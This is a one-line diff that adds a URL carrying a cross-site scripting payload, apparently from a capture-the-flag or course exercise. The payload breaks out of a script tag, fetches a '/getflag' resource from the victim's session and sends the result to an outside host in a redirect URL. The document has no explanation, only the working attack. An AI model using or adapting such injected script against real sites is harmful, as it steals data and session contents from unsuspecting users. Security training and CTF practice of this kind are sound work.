@@ -1,0 +1,1 @@
+http://h4ck3r.quest:8800/?message=123</script><script>fetch('/getflag').then(r=>r.text()).then(flag=>location.href=`http://linux2.csie.ntu.edu.tw:7777/?${flag}`);//
